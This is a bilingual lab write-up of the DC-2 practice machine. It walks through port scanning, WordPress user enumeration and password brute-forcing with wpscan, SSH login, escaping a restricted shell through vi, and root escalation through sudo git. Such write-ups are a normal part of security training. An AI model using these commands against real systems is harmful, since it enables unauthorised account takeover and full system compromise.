---

# ✅ DC-2 渗透笔记增强版

---

## 🧭 信息收集 | Information Gathering

### 🔹 使用 nmap 扫描端口和服务  
Use nmap to scan all ports and identify running services:

```apl
nmap -sS -sV -p- -T4 -Pn <target_ip>
```

扫描发现目标运行 WordPress CMS，确认有 7744 端口开放。
 Scan found the target running WordPress CMS and port 7744 is open.

------

### 🔹 使用 cewl 生成密码字典

Generate password list from the target website using cewl:

```apl
cewl http://dc-2 -w /root/Desktop/pass.txt
```

访问网页发现 flag，确定 CMS 是 WordPress。
 Discovered a flag on the web page and identified the CMS as WordPress.

------

### 🔹 使用 wpscan 枚举用户名

Use wpscan to enumerate WordPress users:

```apl
wpscan --url http://dc-2 -e u
```

扫出用户名 `admin`、`jerry`、`tom`，保存到 `/root/Desktop/user.txt`。
 Enumerated users admin, jerry, and tom; saved to `/root/Desktop/user.txt`.

------

### 🔹 使用 wpscan 爆破登录

Use wpscan to brute-force login with username and password lists:

```apl
wpscan --url http://dc-2 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt
```

成功爆破出两组账号密码。
 Successfully cracked two username-password pairs.

------

### 🔍 使用 dirsearch 扫描目录

Scan for directories to find the login page:

```apl
dirsearch -u http://dc-2
```

找到登录页面后，用 `jerry` 登录，查看 flag 和 flag2。
 Found login page and logged in with jerry user to view flags.

------

## 🎯 漏洞利用 | Exploitation

### 🔹 使用 SSH 登录

Login via SSH using爆破得到的用户：

```apl
ssh tom@<target_ip> -p 7744
```

输入密码成功登录。
 Logged in successfully with password.

------

### 🧱 获得稳定 Shell

默认 shell 受限，需要提权获得完整 shell：

```apl
vi rk
# 在编辑器中输入：
:set shell=/bin/sh
:shell
```

然后设置环境变量：

```apl
export PATH=$PATH:/bin
export PATH=$PATH:/usr/bin
```

提升交互稳定性，获得完整 shell。
 Escaped restricted shell by changing shell in vim and updating PATH.

------

### 🔄 切换用户查找文件

切换到 `jerry` 用户，进入其目录发现 `flag4.txt`：

```apl
su jerry
```

输入密码切换成功。
 Switched to jerry user and found flag4.txt.

------

### 🔍 查看 sudo 权限

查看 sudo 权限：

```apl
sudo -l
```

发现 `/usr/bin/git` 可无密码执行。
 Found sudo NOPASSWD permission for /usr/bin/git.

------

### 🚀 利用 sudo git 提权

使用 git 帮助命令提权：

```apl
sudo git help config
!/bin/bash
```

成功获得 root 权限。
 Successfully escalated privileges to root.

------

## 🏁 总结 | Summary

- 使用 nmap 端口和服务扫描定位目标服务
- 利用 cewl 和 wpscan 收集爆破 WordPress 用户和密码
- 通过 dirsearch 定位登录页面
- 使用 SSH 登录，利用 vim 逃逸受限 shell
- 发现 sudo 权限漏洞，使用 git 提权

> 一条典型的 WordPress 爆破登录与 sudo 权限提权完整链条，适合实战演练。
